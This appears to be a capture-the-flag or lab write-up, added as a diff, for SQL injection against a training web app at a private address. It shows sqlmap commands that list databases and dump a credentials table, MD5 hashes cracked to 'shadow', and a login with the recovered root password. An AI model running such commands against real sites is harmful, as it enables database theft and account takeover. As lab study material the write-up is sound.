@@ -1,0 +1,28 @@
+sqlmap 'http://10.0.2.5/index.php?page=member&id=ff&Submit=Submit#' --dbs 
+
+available databases [6]:
+[*] information_schema
+[*] Member_Brute_Force
+[*] Member_guestbook
+[*] Member_images
+[*] Member_Sql_Injection
+[*] Member_survey
+
+
+sqlmap 'http://10.0.2.5/index.php?page=member&id=ff&Submit=Submit#' --dump -D Member_Brute_Force --tables 
+
+[09:37:39] [INFO] cracked password 'shadow' for user 'root'                                                                                     
+Database: Member_Brute_Force                                                                                                                    
+Table: db_default
+[2 entries]
++----+-------------------------------------------+----------+
+| id | password                                  | username |
++----+-------------------------------------------+----------+
+| 1  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | root     |
+| 2  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | admin    |
++----+-------------------------------------------+----------+
+
+
+go to login page: 
+Username: root
+Password: shadow
